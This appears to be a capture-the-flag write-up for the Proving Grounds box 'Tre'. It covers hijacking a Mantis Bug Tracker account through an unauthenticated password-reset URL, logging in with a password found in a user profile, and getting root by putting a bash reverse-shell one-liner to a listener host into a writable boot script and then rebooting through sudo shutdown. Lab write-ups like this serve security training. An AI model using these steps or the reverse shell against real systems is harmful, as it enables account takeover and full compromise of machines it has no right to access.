This is a write up for the box Tre on proving grounds which is a Linux based box rated as intermediate.

## Enumeration: Port Scan
---
Starting off by running RustScan on the box to find out some open ports.

[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.

prompted to enter creds used "admin:admin"


We are can identify the site is running Mantis Bug Tracker aka Mantis BT. The default credentials did not work which were said to be administrator:root.

I used searchsploit to find some of the common exploits used although there isn't a unauthenticated RCE we can however reset passwords.

```Remote un-authenticated attackers can send HTTP GET requests to Hijack ANY Mantis accounts by guessing the ID / username.\```


Typically the ID of 0 or 1 are used for the Admin user so I will attempt to visit the following page "192.168.134.84/system/verify.php?id=1&confirm_hash="

<img src="/assets/resources/tre/mantis_reset.png" />

We get some random username "XiBejMub" but this means the exploit is working so I just reset the password for this user and logged in.

After logging in and browsing through severeal tabs the users tab reveals some interesting information.

As shown below the user Tre put the real name value as "Tr3@123456A!" which appears to be password.

## Priv Esc: Sudo Shutdown

```
tre@tre:~$ sudo -l
Matching Defaults entries for tre on tre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown
tre@tre:~$ 
```

We are able tor un the command shutdown as root. However this does not do us any good unless we have control over a binary that gets executed upon boot up.

After some digging around it was found that we have the ability to edit the following file which is also owned by root. "/usr/bin/check-system"

This file essentially gets executed on boot and states wehenver a particular service is started and checks it. I will add a bash one liner to the script.

```/bin/bash -i >& /dev/tcp/192.168.49.134/8082 0>&1 ```

After shutting down the sysetem with the command "sudo /sbin/shutdown -r now" we get root on our listener @ 8082

## Breakdown 
---
1. Dirbusting revealed a system directory using default creds of admin admin
2. Mantis BT contained a password reset vulnerablity
3. User Tre had his password exposed to everyone as they mistakenly entered it under Real Name
4. SSH as Tre 
5. Sudo -L Revealed Shutdown
6. Enumeration revealed a binary tre had read/write access to owned by root.
7. Edited binary with rev shell
8. sudo reboot - now and got a shell
